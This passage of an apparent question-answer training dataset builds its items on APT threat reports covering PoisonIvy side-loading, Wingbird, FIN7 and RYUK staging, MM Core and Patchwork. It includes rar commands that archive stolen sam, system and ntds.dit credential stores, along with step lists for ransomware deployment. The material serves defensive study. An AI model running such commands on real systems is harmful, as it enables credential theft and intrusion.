stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action. By creating these accounts, they ensured they would maintain access between different waves of the attack. Once the threat actor regains their foothold, they already have access to a high-privileged domain user account. This significantly reduces the \"noise\" of having to use credential dumpers repeatedly, which helped them evade detection.\nBig Headline: PoisonIvy\nA second method the threat actor used to maintain access across the compromised assets was through the deployment of the (PIVY). This infamous RAT has been associated with many different Chinese threat actors, including APT10, , and . It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine. Among its most notable features are:\nRegistry Editor\nScreenshot Grabber\nCredential Stealer\nInteractive Shell\nFile Manager with Upload and Download Support\nProcess Monitor\nKeylogging and Various other Surveillance Features\nThe control panel for PoisonIvy.\nCourtesy of Sam Bowne -\nWe assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.\nThe strain of PIVY in this attack used a technique to stealthily load itself into memory. To accomplish this, it exploited a trusted and signed application. The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:\n1. A (NSIS) was created with a legitimate, signed Samsung tool in it.\n2. Once executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.\n3. The DLL contains a PIVY stager, which is then loaded by the Samsung tool.\n4. After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.\n5. It was able to achieve persistence by creating a rogue scheduled task.\nPost-persistence execution of PIVY, side-loaded into a legitimate Samsung application.\nPIVY's use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.\nBig Headline: Compressing the Stolen Data\nIn an attempt to hide the contents of the stolen data, the threat actor used to compress and password-protect it. The winrar binaries and compressed data were found (<https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf>)mostly in the , a TTP that was , as well as others. This threat actor is known to stage the data in multi-part archives before exfiltration.\nThe threat actor used the following commands to compress the data.\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv\nrar a -r -[password] [REDACTED].rar sam system ntds.dit\nCompressed stolen data exfiltrated via web shell.\nThe contents of the compressed data was crucial in understanding the threat actor's motivation for the attack, as well as what type of information they were after.\nQ: What role did the PoisonIvy RAT play in Operation Soft Cell, and how did the threat actor utilize it to maintain persistence and control over compromised assets?",
    "output": "PoisonIvy RAT played a crucial role in maintaining access and control over compromised assets. It is a powerful, multi-featured RAT that includes capabilities such as registry editing, screenshot grabbing, credential stealing, interactive shell, file management, process monitoring, and keylogging. The threat actor likely used PoisonIvy for keylogging and other surveillance features. Persistence was achieved by exploiting a trusted and signed application, specifically a Samsung tool, through DLL side-loading techniques, and creating a rogue scheduled task.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Activity Group Profile: NEODYMIUM\nCampaign summary: NEODYMIUM is an activity group that, like PROMETHIUM, conducted an attack campaign in early May 2016. NEODYMIUM also used the exact same CVE-2016-4117 exploit code that PROMETHIUM used, prior to public knowledge of the vulnerability's existence.\nNEODYMIUM used a backdoor detected by Windows Defender as Wingbird, whose (<https://www.symantec.com/security_response/writeup.jsp?docid=2012-072615-4146-99&tabid=2>)characteristics closely match FinFisher, a government-grade commercial surveillance package. Data about Wingbird activity indicates that it is typically used to attack individuals and individual computers instead of networks.\nAdministrators and users wondering whether they were targeted by NEODYMIUM can scan their networks by using the indicators listed in the appendix, by using Windows Defender to examine their logs for \"Wingbird,\" or by searching for NEODYMIUM in their (<https://blogs.windows.com/windowsexperience/2016/03/01/announcing-windows-defender-advanced-threat-protection/>)Windows Defender Advanced Threat (<https://blogs.windows.com/windowsexperience/2016/03/01/announcing-windows-defender-advanced-threat-protection/>)Protection product console alerts.\nAttack details: Target individuals were sent customized spear phishing emails. An image of one such customized email from this campaign is shown in the following figure.\nFigure 2. The spear phishing campaign that NEODYMIUM launched in May 2016 is highly customized to target individuals; a large portion of the email has been redacted to protect the privacy of the targeted individual, which shows the extent of personalization of the malicious email\nWhen the user opened the attachment, a blank document displayed. In the background, a series of events, including the use of the CVE-2016-4117 zero-day exploit, ultimately led to the download and execution of a backdoor. The exploit code executes only if the Microsoft Office (<https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653>)Protected View setting is turned off. By default, documents opened from the Internet (using web browsers or email clients) are opened in protected view mode, which prevents execution of embedded objects and potentially malicious code.\nFigure 3. The NEODYMIUM attack chain shows how the exploit CVE-2016-4117 was used to infect target individuals' computers\nThe backdoor payload showed behavior that matched publicly documented traits of a program called FinFisher, a government-grade commercial surveillance package marketed to law enforcement and intelligence agencies. The publisher, (<http://www.finfisher.com/FinFisher/>)FinFisher GmbH, claims that it sells the software exclusively to government agencies for use in targeted and lawful criminal investigations. It is likely that the backdoor payload is a relatively new version of the commercial spyware.\nThe apparent use of a version of FinFisher suggests that the exploit and the spear fishing campaign that delivered it were the work of an attack group probably connected in some way to a state actor.\nWindows Defender detects the backdoor payload as Wingbird. Visibility into the usage of Wingbird shows it has been used only against individuals, not against computers that are part of an organization's network.\nResearch into Wingbird from May through November 2016 showed only tens of victims, predominantly in Turkey.\nFigure 4. NEODYMIUM victim breakdown, by country for May through November 2016\nLike Truvasys, Wingbird is designed to run on both 32-bit and 64-bit Windows platforms. The malware is a native 32-bit PE executable that installs a number of additional executables and files. These components are all embedded within the dropper itself, which allows the malware to avoid downloading components and consequently attracting attention.\nAfter the backdoor executes, the malware checks the underlying operating system version and, depending on what platform it is running on, drops several files to %ProgramData%\\RpcSrv (on 32-bit computers) or %ProgramData%\\AuditService (on 64-bit computers).\nIn addition, on 64-bit computers the dropper creates a secondary native 64-bit payload executable, referred to in the following diagram as [Payload64].exe. The 32-bit processes are isolated from 64-bit processes and restricted in the actions they can perform. By providing a separate 64-bit payload, Wingbird attempts to inject code into 64-bit processes as well as 32-bit processes.\nFigure 5. Wingbird behaves differently on 32-bit computers and 64-bit computers\nThe main goal of the original dropper is to indirectly deliver executables by injecting malicious code and data into two Windows system processes, Services.exe and Winlogon.exe. The primary Wingbird payload uses anti-VM, anti-debugging, and anti-AV mechanisms to evade discovery and analysis.\nOn 32-bit computers, the original dropper creates three files, as shown in Figure 5. Of the three files, the only true binary is rpcsrv.dat, a kernel rootkit that enables the attacker to load and run privileged unsigned code. The other two files, installer.cab and the randomly named [xxxxx].cab, are encrypted data files.\nWingbird attempts to detect and evade security products. For example, some of the strings found in running processes, such as avcuf32.dll and <un-wnd%.08x>, indicate that the malware checks for the presence of one of several versions of Bitdefender security software.\nThrough a series of actions and code injections, the original malware installs the rootkit driver, rpcsrv.dat, a non-standard kernel driver. The attackers know that 64-bit computers are much more secure because they prevent loading of unsigned drivers, so they do not even attempt this technique on 64-bit systems. The malware searches for a file called ico_ty23.ico, which is (<https://www.symantec.com/security_response/writeup.jsp?docid=2012-072615-4146-99&tabid=2%20>)publicly documented as the filename one of the key user mode DLL components of FinFisher.\nOn 64-bit computers, the installation of Wingbird is a lot more complicated. The 64-bit version of the original payload creates a new folder, %ProgramData%\\AuditService, and copies the Windows system file lsass.exe from %SystemFolder% into the new folder. At the same time, the payload drops a malicious file known as sspisrv.dll alongside the copy of lsass.exe. This sspisrv.dll file shares its name with a code library that implements several APIs that lsass.exe is designed to import.\nFigure 6. Wingbird payload's behavior on 64-bit computers\nThe original 32-bit dropper continues monitoring until the folder and file are created. After the 64-bit payload is done copying files, its parent process (the 32-bit dropper) deletes it. The parent process then deletes itself as an attempt to hide its tracks and prevent analysis by security professionals.\nThe 64-bit malware then injects code into services.exe, the Service Control Manager, to register a service using a clean lsass.exe that would load the malicious sspisrv.dll, which would then inject malicious code into svchost.exe. The constant delegation of malicious code control from one process to the next is a way to hide execution of unwanted code and make it extremely difficult to detect the presence of Wingbird.\nThis version of Wingbird has also been observed with the ability to execute highly privileged kernel code by injecting code through vulnerable signed\ndrivers. It maintains a list of legitimate yet vulnerable drivers that can be exploited to inject and execute kernel code.\nIt appears that Wingbird obfuscates its code at source level, rather than binary level, to evade analysis tools and security solutions.\nSimilar to the 32-bit version, this version of Wingbird performs a check for a file named ico_sf46.ico, which is a known component of FinFisher.\nRead the text above and answer this question: How did NEODYMIUM leverage the CVE-2016-4117 exploit in their attack campaign, and why was the Microsoft Office Protected View setting critical in preventing the exploit's success?",
    "output": "NEODYMIUM leveraged the CVE-2016-4117 exploit by embedding it in a spear phishing email attachment. When the user opened the attachment, a blank document displayed, but in the background, the exploit code executed if the Microsoft Office Protected View setting was turned off. Protected View is crucial because it prevents the execution of embedded objects and potentially malicious code, thereby thwarting the exploit.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What characteristics of the Elise backdoor Trojan suggest that it is a custom tool developed specifically for the Lotus Blossom group, and why does the long duration of the campaign indicate that the attackers are well-resourced?",
    "output": "The Elise backdoor Trojan is a custom tool not readily available online, and it appears to be used exclusively by the Lotus Blossom group. This exclusivity suggests that the tool was likely developed specifically for their operations. The targets of this group are almost exclusively military and government organizations, whose data is most valuable to other nation states rather than criminal actors. The fact that this campaign has been ongoing for over three years indicates that the individuals behind the attack are well-resourced, as sustaining such a prolonged and targeted operation requires significant investment in terms of time, expertise, and financial support.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: ChessMaster and APT 10 Plays the Same Cyberespionage Game\nIf that sounded familiar, it's because ChessMaster and APT 10 appear to be playing the same cyberespionage game. Here's a further illustration:\nWe first saw ChChes set its sights on an organization that's long been a target of APT 10/menuPass. As we caught and delved into more ChChes samples in the wild, however, we also saw how they followed the same pattern\u2014exclusive packers, mutual targets, overlapping C&C infrastructure.\nChChes' packer, for instance, resembled the one used in menuPass' old PlugX samples. DNS records also showed that some of their command and control (C&C) servers and domains resolved to the same IP address, or resided in the same subnet. Are they operated by the (<http://blog.trendmicro.com/trendlabs-security-intelligence/following-trail-blacktech-cyber-espionage-campaigns/>)same actors? Their commonalities make it appear so. It's also known to happen; are a case in point.\nChessMaster's ChChes also resembles another backdoor, , which first made waves in 2014. They have the same endgame. Both are second-stage payloads that use the system's Security Identifier (SID) as encryption key so they execute only in their target's machine. Their difference lies in complexity\u2014ChChes hides part of the decryption key and payload in registry keys to make it harder to reverse engineer.\nBut that's just one dot in several we've connected. In one instance, we detected PlugX and Emdivi on the same machine. This PlugX variant connected to an APT 10/menuPass-owned domain, but the packer is similar to that used by ChChes. While it's possible it was hit by two different campaigns, further analysis told a different story. Both were compiled on the same date, only several hours apart. We detected and acquired the samples the next day, which means both backdoors were delivered to the victim a day after they were compiled.\nBig Headline: Take 'Control of the Center'\nUltimately attacks like ChessMaster's make pawns out of the systems, networks, devices and their users, all of which hold the organization's crown jewels. This is why enterprises need to be steps ahead of the game: prepare, respond, restore, and learn. Plan ahead\u2014what techniques will attackers use? How can I defend against them? Don't just pull the plug\u2014 understand what happened to better assess and mitigate the damage. Fine-tune your response\u2014what worked, what didn't, and what could've been done better?\nDefense in depth plays a crucial role especially for the IT/system administrators and information security professionals that watch over them. The , , , , and web/email are the bishops, knights, and rooks that underpin the enterprise's crown jewels, which is why securing them is important. Reduce their attack surface. Keep the systems updated and regularly patched, and enforce the principle of least privilege. Employ behavior monitoring and . Deploy firewalls as well intrusion detection and prevention systems. Implement URL categorization, , and .\nThe Indicators of Compromise (IoCs) related to ChessMaster's campaigns is in this.\nUpdated on August 14, 2017, 11:50 PM to include IoCs related to ChessMaster.\n\nHow does the use of specific packers by ChessMaster and APT 10 suggest a potential link between these two threat groups? What implications does this have for cybersecurity professionals in identifying and mitigating such threats?",
    "output": "The use of specific packers by ChessMaster and APT 10 suggests a potential link between these two threat groups due to the similarities in their techniques. For example, ChChes' packer resembled the one used in menuPass' old PlugX samples. Additionally, DNS records showed that some of their command and control (C&C) servers and domains resolved to the same IP address or resided in the same subnet. These commonalities indicate that they might be operated by the same actors. This has significant implications for cybersecurity professionals, as understanding these links can help in identifying patterns and attributing attacks to specific threat groups. By recognizing these similarities, security teams can better prepare defenses, anticipate future tactics, and develop more effective mitigation strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThis summer Truesec observed an attacker that used the tools and techniques of FIN7, including the CARBANAK RAT, to take over the network of an enterprise. In a subsequent attack almost six weeks later this foothold was used to deploy the RYUK ransomware on the victim network.\nThis attack marks the first instance Truesec has observed of the combination of FIN7 tools and the RYUK ransomware, indicating a change in pattern for FIN7 attacks. Up until now FIN7 has not been associated with ransomware attacks. This also suggests a closer collaboration between FIN7 and the RYUK group, also known as WIZARD SPIDER or FIN6, than has been previously known by Truesec.\nIt is possible FIN7 simply sold the access to the RYUK group, but it is probable that FIN7 and WIZARD SPIDER are more closely affiliated and may be part of the same organized crime network.\nSmall Headline: JavaScript backdoor\nThis appears to be the same as the JavaScript backdoor in an  by Morphisec from November 2018. As described in the article this was used by FIN7 to deploy the CARBANAK RAT.\nThe backdoor connected to domain sephardimension[.]com. Some of the functions of the JavaScript backdoor are illustrated below.\nThese functions are clearly later versions of the code  in the article by Morphisec.\nFrom the JavaScript backdoor on the compromised client, the threat actor began performing typical escalation attempts in the Active Directory.\nSmall Headline: PowerShell RAT\nOnce the attacker had ensured they had admin privileges, they launched RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT, previously unknown to Truesec. The PowerShell RAT connected to another malicious domain: hxxps://besaintegration[.]com/gate.\nThe PowerShell RAT includes functions to retrieve basic system information and provides capabilities to start and manage arbitrary commands as background jobs.\nThe different functions are illustrated below.\nVery Small Headline: CARBANAK RAT\nThe last action the attacker performed at this stage was to also install the CARBANAK RAT as an additional backdoor onto domain controllers of the victim network. The attacker downloaded an obfuscated script that when executed, loads a DLL file in memory and executes it through reflection methods.\nIt then connects to Command-and-Control server 170.130.55[.]85:443 in order to download the malware configuration file anunak_config which is a (<https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/>)known component of the CARBANAK RAT. Once the CARBANAK RAT was installed, it would beacon to the same C2 server.\nOnce the actor had deployed the PowerShell RAT and CARBANAK RAT, no further action was taken on the compromised network for several weeks.\nSmall Headline: Data Theft\nDuring this stage, the attacker also exfiltrated data from the victim network. The exfiltration was done using the SmartFTP Client that connected to an IP address controlled by the attacker.\nThe names of some of the files that were exfiltrated were found in the file \"Unlocker-List.txt\". This file is part of the IObit Unlocker software, installed by the attacker, likely to facilitate the ransomware execution or file copy operations by unlocking locked files.\nSmall Headline: RYUK Ransomware\nA week after the attacker had begun reconnaissance of the network and exfiltrated the data they wanted; they deployed the RYUK ransomware. The Ransomware was deployed using both manual and scripted methods.\nThe high-level description of the staging procedure is summarized below:\n1. Identify server hostnames and IP addresses in the domain\n2. Prepare batch file to disable protections and security software (kill.bat)\n3. Prepare RYUK ransomware (svchost.exe)\n4. Copy kill.bat\n5. Disable User Account Control\n6. Run kill.bat\n7. Copy RYUK ransomware (svchost.exe)\n8. Run RYUK ransomware (svchost.exe)\nSteps 4-8 were performed on all identified servers in the victim network, using both IP address and hostname. Remote code execution was achieved with two methods: remote WMI command execution and using Microsoft Sysinternals' utility PsExec.\nSmall Headline: Conclusions\nThe first two stages of the attack, when the attacker took over the network, clearly bears the mark of the criminal threat actor known as FIN7. Both the JavaScript backdoor and the way it was installed, and CARBANAK RAT are tools that have been attributed to FIN7. No attempt to identify resources in the network was made at this time, once the attacker had control of the network.\nThe subsequent stages, in which data was stolen and a ransomware was deployed, occurred almost six weeks after the initial compromise. This part of the attack was done using tools and techniques that are indicative of the  ransomware group, also known as WIZARD SPIDER or FIN6. This was also conducted from an entirely different infrastructure than the initial stages attributed to FIN7.\nThe progress of the attack clearly indicates that different stages of the attack were conducted by different teams. It's possible that the FIN7 group are now more focused on just gaining access and then let a team from the RYUK group take over and deploy ransomware.\nThis suggests a closer collaboration between FIN7 and the RYUK group than has been previously known by Truesec. It is possible FIN7 simply sold the access to the RYUK group, but it is probable that the two groups have even stronger ties. The RYUK group are known to  to gain foothold for their ransomware attacks.\nIt consequently seems possible that FIN7 and WIZARD SPIDER are now both part of the same sprawling organized crime network.\n\nHow did the attackers deploy the RYUK ransomware across the victim network, and what steps did they take to prepare for its execution? What methods were used for remote code execution during the deployment phase?",
    "output": "The attackers deployed the RYUK ransomware using both manual and scripted methods. The staging procedure involved identifying server hostnames and IP addresses, preparing a batch file to disable protections and security software (kill.bat), preparing the RYUK ransomware (svchost.exe), copying and running the kill.bat file, disabling User Account Control, and finally copying and running the RYUK ransomware. Steps 4-8 were performed on all identified servers using both IP address and hostname. Remote code execution was achieved through remote WMI command execution and using Microsoft Sysinternals' utility PsExec. This systematic approach ensured widespread deployment of the ransomware across the victim network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Infection Method\nPreviously the MM Core downloader component was downloaded and executed through shellcode by a DOC file exploiting CVE 2012-0158. However, the new DOC exploit we found exploits a more recent CVE-2015-1641 Microsoft Word vulnerability which it uses to extract embedded malware. The extracted malware is then executed by leveraging a DLL side-loading vulnerability.\nThe DOC file we analysed (SHA1 d336b8424a65f5c0b83328aa89089c2e4ddbcf72) was named \"US pak track ii naval dialogues.doc\". This document exploits CVE-2015-1641 and executes shellcode which drops a legitimate Microsoft executable along with a trojanised DLL named \"ChoiceGuard.dll\". The shellcode then executes the Microsoft executable, causing the malicious DLL to automatically be loaded into the file when it is run - hence the term \"side-loading\". The DLL downloads and executes the file-less MM Core backdoor in memory, which uses (<https://www.rapid7.com/db/modules/encoder/x86/shikata_ga_nai>)steganography to hide itself inside a JPEG file. The JPEG contains code to decrypt itself using the Shikata ga nai algorithm.\nOnce decrypted and executed in memory, the MM Core backdoor will extract and install an embedded downloader when it is first run and add it to Windows start-up for persistence. This downloader, which is similar to the first trojanised DLL, is then executed and will download the MM Core JPEG once again, executing it in memory like before. This time MM Core will conduct its backdoor routine which will send off system information and await further commands.\nAn overview of this infection process is as follows:\nBig Headline: Evasion Tactics\nThe MM Core actors have made significant efforts to prevent security researchers from tracking their infrastructure. The first two versions of MM Core back in 2013 used spoofed registrant information in order to register the C2 domains, whereas the new campaigns use C2s registered using a registrant privacy protection service. This makes it more difficult to track the actors' infrastructure using WHOIS data.\nThe actors have also registered their domains on BigRock, a popular web hosting company, in order to blend in with the noise of legitimate sites that are hosted on the same infrastructure.\nBig Headline: Conclusion\nMM Core is an active threat targeting multiple countries and high profile industries. It is interesting to note that even though MM Core's version has incremented twice, the core backdoor code has remained almost the same apart from the new file and mutex names. Largely this is perhaps due to the file-less nature of its payload, which may also explain why the majority of the updates were in the delivery mechanism. At the same time this demonstrates that the attackers behind MM Core very well know what they are doing, updating the malware just enough to keep their operation under the radar after all these years.\nOn the other hand, while the volume of related MM Core samples remain low, we noticed that the MM Core downloader shares code, techniques and network infrastructure with a trojan called \"Gratem\", as well as sharing the same authenticode certificate for recent samples. Gratem is a more active downloader malware family which has been distributed since at least 2014. Ultimately this suggests that MM Core may be a part of a larger operation that is yet to be fully uncovered.\n\nHow does the new version of MM Core leverage DLL side-loading to execute its payload, and what specific vulnerabilities are exploited in this process?",
    "output": "The new version of MM Core exploits a more recent CVE-2015-1641 Microsoft Word vulnerability to extract embedded malware. The extracted malware is then executed by leveraging a DLL side-loading vulnerability. Specifically, the DOC file named 'US pak track ii naval dialogues.doc' exploits CVE-2015-1641 and executes shellcode which drops a legitimate Microsoft executable along with a trojanised DLL named 'ChoiceGuard.dll'. The shellcode then executes the Microsoft executable, causing the malicious DLL to automatically be loaded into the file when it is run\u2014hence the term 'side-loading'. The DLL downloads and executes the file-less MM Core backdoor in memory.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: INTRODUCTION\nChairman McCain, Vice Chairman Reed, and Members of the Committee thank you for the invitation to offer the testimony of the Department of Defense and the Intelligence Community on cyber threats to U.S. national security. Our statement reflects the collective insights of the Intelligence Community's extraordinary men and women whom we are privileged to lead. We in the Intelligence Community are committed every day to provide the nuanced, multidisciplinary intelligence that policymakers, warfighters, and domestic law enforcement personnel need to protect American lives and America's interests anywhere in the world.\nThe order of the topics presented in this statement does not necessarily indicate the relative importance or magnitude of the threat in the view of the Intelligence Community.\nInformation available as of 1 January 2017 was used in the preparation of this assessment.\n\nHow does the Intelligence Community ensure that its cyber threat assessments are comprehensive and effective in protecting American lives and interests?",
    "output": "The Intelligence Community ensures that its cyber threat assessments are comprehensive and effective by providing nuanced, multidisciplinary intelligence. This approach involves integrating insights from various disciplines within the community to offer a well-rounded perspective. By doing so, they equip policymakers, warfighters, and domestic law enforcement personnel with the necessary information to protect American lives and interests both domestically and internationally. This commitment underscores the dedication of the Intelligence Community to safeguarding the nation against evolving cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Targets\nAs other researchers observed, Patchwork originally targeted governments and government-related organizations. However, the group has since expanded its focus to include a broader range of industries.\nWhile most of the interest still lies in the public sector, more recent attacks were found targeting the following industries:\nAviation\nBroadcasting\nEnergy\nFinancial\nNon-governmental organizations (NGO)\nPharmaceutical\nPublic sector\nPublishing\nSoftware\nAccording to Symantec telemetry, targeted organizations are located in dispersed regions. Although approximately half of the attacks focus on the US, other targeted regions include China, Japan, Southeast Asia, and the United Kingdom.\nAviation, NGOs, energy, financial, among industries targeted by Patchwork cyberespionage group\nBig Headline: Attack vector\nOur first observation of an attempted attack related to this campaign dates back to November 2015, although Symantec telemetry data indicates that the campaign may have already existed in early 2015 or perhaps even earlier.\nThe threat actor mainly relies on a legitimate mailing list provider to send newsletters to a select number of targets. The newsletter includes a link to the attacker's website, which has content focusing on topics related to China to draw the target's interest. These websites are hosted on the same domains as the mailing list provider. Each website is customized for the intended target, and contains specialized topics related to the targeted industries.\nThe malicious sites link to files hosted on different domains, which appear to be solely used for malicious purposes. The domains are registered under names that pose as legitimate sources for Chinese intelligence. Several domains predominantly used in the attacks are hosted on two servers with the IP addresses 212.83.146.3 and 37.58.60.195.\nThese websites host two different types of malicious files: a PowerPoint file (.pps) and a rich text file with a Word .doc extension.\nFrom what we can confirm, the documents contain copies of publicly available content taken from legitimate websites. Topics range from military/defense, hospital, naval disputes, and even malware removal.\nBig Headline: Malicious PowerPoint files\nNothing happens when the file is opened on PowerPoint 2016. However, when the file is opened on older versions of PowerPoint, it displays a security warning asking whether the user wants to open driver.inf depending on the environment, such as the version of the operating system and the patch applied.\nIf the user chooses to open the file, the computer will be compromised. If the user chooses not to open it, the computer will not be infected. However, will be dropped, though not executed, into the temporary directory when the .pps file is opened. This poses a risk of compromise to the intended target.\nWe have confirmed this issue on all versions of PowerPoint tested in the lab. Users should manually remove any potential dropped files which would typically be named \"sysvolinfo.exe\".\nBig Headline: Main payloads\nBoth the .doc and .pps files mainly drop two malware families. Typically, the PowerPoint Slide file drops Backdoor.Enfourks, an AutoIT executable which is usually bloated with meaningless data and targets mainly 32-bit systems. The .doc file drops Backdoor.Steladok.\nWhile both back door Trojans wait for commands from the threat actor, they can search for files and upload them to the specified server once activated. For unknown reasons, both threats use Baidu, the Chinese software vendor, in their routines. The Trojans confirm an internet connection by pinging Baidu's server and create a registry entry with the vendor's name to run every time Windows starts. As two file types are used to deliver two different payloads, there are likely multiple individuals or groups contributing to the malware development efforts.\nBig Headline: Mitigation\nUsers should adhere to the following advice to prevent Patchwork's attacks from succeeding:\nDelete any suspicious-looking emails you receive, especially if they contain links or attachments. Spear-phishing emails are frequently used by cyberespionage attackers as a means of luring victims into opening malicious files.\nKeep your operating system and other software updated. Software updates will frequently include patches for newly discovered security vulnerabilities which are frequently exploited by attackers.\nKeep your security software up to date to protect yourself against any new variants of this malware.\nQ: What are the two types of malicious files used by the Patchwork group and how do they function differently?",
    "output": "The Patchwork group uses two types of malicious files: a PowerPoint file (.pps) and a rich text file with a Word .doc extension. When the PowerPoint file is opened on older versions of PowerPoint, it displays a security warning asking whether the user wants to open 'driver.inf'. If the user agrees, the computer will be compromised. The .doc file drops a different type of backdoor Trojan called Backdoor.Steladok. Both file types are designed to drop different malware families, suggesting multiple contributors to the malware development efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key indicators of compromise (IOCs) provided in the report, and how can they be used to detect and mitigate the threat posed by the Four Element Sword APT?",
    "output": "The key indicators of compromise (IOCs) provided in the report include specific command and control (C2) IP addresses and URLs, as well as MD5 and SHA-256 hashes for various malicious files. These IOCs can be used to detect and mitigate the threat posed by the Four Element Sword APT by incorporating them into security tools and processes. For example, network traffic can be monitored for connections to the specified C2 IP address (198.55.120[.]143:7386) and URL (http://198.55.120[.]143:7386/B/ResN32.dll). Additionally, endpoint protection solutions can be configured to detect and block files with the listed MD5 and SHA-256 hashes. This multi-layered approach helps in identifying and containing the threat effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attack analysis\nThe file that Susan received and opened looked like this.\nIt actually was an executable file that used the icon typically used by Adobe Acrobat Reader documents to trick users.\nThe figure below illustrates the execution flow:\nThe file is just a self-extracting file. Once run, it creates a folder and extracts six files into it. It then runs one of them \u2013stat.vbs\u2013 and does not take any more actions.\nThere is no malicious activity, so the file goes unnoticed by behavior-based detectors. The stat.vbs file simply runs another file \u2013deca.bat\u2013 in the background.\nThis file in turn opens the pic.pdf file (the blank PDF document that opened on Susan's computer) and runs a file called dcp.exe, a free tool to encrypt files.\nThis utility is used to decrypt the following two files:\nNext, it uses the unzip.exe program to extract the content of the bare.zip file (12 files) into a different folder. Then, it runs one of the files: sai.vbs.\nNone of these actions are anomalous, and actually are very different from what we normally see in other types of attacks.  Here is where the second part of the attack begins:\nThe .vbs file runs a .bat file that modifies the Windows registry to ensure that a file called aagi.bat is run every time the system starts. Then, it makes a copy of the four files with the extension .abc, and changes their extension to .exe. These are all legitimate applications that anybody could use: the first three are designed to collect the credentials (user names and passwords) stored in the local mail client and Internet browser, and save them to a text file.\nThe fourth one is an application designed to run another application every 'x' seconds. This is very useful for computers that need to run an application at all times, like a browser or any other specific software, so that if the application closes unexpectedly for some reason it will open again.  In this case the application is configured to run another .bat file every 3,600 seconds (every hour).\nThen, the ici.bat file uses the ATTRIB system command to hide the two folders it created, disables the Windows firewall, and renames the text files containing the credentials to  PIC_%d_%t, where %d is the current date and %t the current time. This is done to indicate when the information they contain was obtained.\nFinally, it uses the FTP command to upload those files to an external FTP server controlled by the attackers.\nAdditionally, it runs the file iei.bat every hour, which basically takes the following actions:\nIt renames the .abc files back to .exe, in case they were deleted. It then deletes all the text files with credentials that were already uploaded to the FTP server, restores the Windows registry key in case it was deleted, runs the applications designed to collect credentials, renames the resulting files and uploads them to the FTP server.\nAs you can see, no malware is ever used in the attack, the hack makes use of legitimate tools and different scripts to perform the aforementioned actions.\nBut, is this type of attack really effective? As mentioned before, no antivirus was capable of detecting it. Furthermore, its peculiarities seem to indicate that the proactive protection layers included in most antivirus solutions would not be able to detect its apparently harmless behavior.\nThis was confirmed when we accessed the FTP server that the stolen data was sent to, and found that the oldest files dated back to August 2013. That is, the attack had been underway for almost six months completely undetected.\nBig Headline: A targeted attack?\nOnce we accessed the FTP server, the first thing we did was  look for credentials belonging to Black Gold, since, despite being able to neutralize the attack on Susan's computer, another employee could have fallen victim to it. The result was negative, no credentials had been stolen from the company.\nHowever, we were surprised by the large number of files stored on the FTP server: over 80,000 text files with stolen credentials from other firms. This didn't look like a targeted attack, where the number of victims is usually low.\nHowever, after opening three files at random, we found that they belonged to three companies all in the same industrial sector that Black Gold belongs to.\nAs mentioned in the previous section, the attack took place recurrently every hour. This means that stolen credentials were sent to the FTP server every hour. We discarded duplicate files and ended up with 860 unique files.\nThat was still too many files for a targeted attack. The only thing left to do was manually process all these files and try to identify the victims.\nThe files belonged to some ten companies, all of them in the oil and gas maritime transportation sector.\nIt was clear that the hack was indeed a targeted attack, but we still didn't know what the attackers were really after, what their final objective was.\nWhat didn't seem a targeted attack at first, ended being a whole conspiratorial plot against the sector.\nBig Headline: Nigeria, scams and oil\nThe so-called Nigerian scams have been a constant presence on the Internet since its inception, and even before that, when fraudsters used postal mail to defraud victims.\nIn the most popular one, the scammer passes themselves off as an important figure in the Nigerian government or some other institution, and contacts the victim offering them a share in a large sum of money that they want to transfer out of the country.\nHowever, the Nigerian scam industry is large and varied. Some variants are almost unknown and affect all kinds of sectors,  including the oil industry.\nThe Nigerian town of Bonny is well-known in oil production circles as the oil produced there, known as Bonny Light Crude Oil (BLCO), has a very low sulfur content, which makes it a highly desired grade for its low corrosiveness.\nThe fact that this particular type of oil is in such high demand has given rise to a particular type of scam aimed at oil brokers, individuals who arrange transactions involving crude oil between buyers and sellers.\nIn Nigeria, every gas and oil transaction is supervised by the NNPC (Nigerian National Petroleum Corporation), a government-owned company. Anybody who wants to trade with oil in Nigeria must be registered with the NNPC.\nIn short, the scam works like this: the scammer contacts a broker/middleman and offers them a large amount of BLCO, one to two million barrels, at a very competitive price.\nIf the potential buyer is interested, they will ask for documentary evidence that the product exists (Proof of Product). There are different types of documents that can be provided: a quality certificate, a certificate of origin, a cargo manifest, or the letter of ATS (Authority to Sell) issued by the NNPC.\nTo close the deal, the buyer must pay a significant amount of money -from $50,000 to $100,000- in advance. However, once they pay the money they are met with the nasty surprise that there is no oil.\nThe weakest link in the scam is the documentation that the scammer must provide to convince the buyer. Even though all of these documents can be forged, the fraudster runs the risk of being discovered by the broker.\nTo make it more plausible, scammers 